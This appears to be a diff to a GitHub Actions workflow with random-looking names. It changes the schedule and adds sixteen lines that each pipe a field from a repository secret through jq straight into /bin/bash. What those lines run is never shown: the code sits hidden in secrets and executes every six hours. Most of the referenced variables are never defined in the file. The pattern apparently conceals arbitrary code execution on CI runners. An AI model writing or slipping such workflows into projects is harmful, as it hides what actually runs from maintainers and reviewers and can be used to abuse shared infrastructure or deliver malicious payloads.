@@ -3,8 +3,7 @@ name: liyueqing1829
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 5/6 * * *'
-
+    - cron: '13 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,12 +12,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: liyueqing1829
         env:
-          tuo44632: ${{ secrets.tuo44632 }}
+          l48: ${{ secrets.l48 }}
         run: |
-          echo $tuo44632 | jq -r .zjp9888 | /bin/bash
-          echo $aw641 | jq -r .fb34587 | /bin/bash
-          echo $dg2044 | jq -r .rer6 | /bin/bash
-          echo $fg45 | jq -r .e0327 | /bin/bash
-          echo $e5096 | jq -r .v63 | /bin/bash
-          echo $pw6147 | jq -r .tzgbn4164 | /bin/bash
+          echo $l48 | jq -r .ul3 | /bin/bash
+          echo $bq85 | jq -r .fdtac60 | /bin/bash
+          echo $bfe17996 | jq -r .cuef7 | /bin/bash
+          echo $pxdng88754 | jq -r .ltc9 | /bin/bash
+          echo $vo2317 | jq -r .dk6566 | /bin/bash
+          echo $sxa87 | jq -r .iak2617 | /bin/bash
+          echo $kkmf845 | jq -r .g1 | /bin/bash
+          echo $caenb0 | jq -r .hqyei39 | /bin/bash
+          echo $wfr8974 | jq -r .nb3 | /bin/bash
+          echo $v3359 | jq -r .jmov1 | /bin/bash
+          echo $di0 | jq -r .wvyta76 | /bin/bash
+          echo $j60 | jq -r .z881 | /bin/bash
+          echo $l3 | jq -r .thg1490 | /bin/bash
+          echo $p9 | jq -r .swp6 | /bin/bash
+          echo $ult231 | jq -r .qgjmt16 | /bin/bash
+          echo $u2 | jq -r .ynfc54825 | /bin/bash
 
